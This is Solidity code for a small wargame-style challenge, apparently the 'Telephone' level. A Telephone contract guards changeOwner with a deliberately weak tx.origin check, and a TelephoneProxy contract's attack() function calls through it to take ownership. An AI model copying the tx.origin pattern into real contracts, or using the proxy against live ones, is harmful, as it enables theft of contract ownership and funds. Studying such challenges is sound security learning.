pragma solidity ^0.6.0;
import "./Telephone.sol";

contract TelephoneProxy {
    Telephone telephone;

    constructor(address _telephoneAddress) public {
        telephone = Telephone(_telephoneAddress);
    }

    function attack() external {
        telephone.changeOwner(msg.sender);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}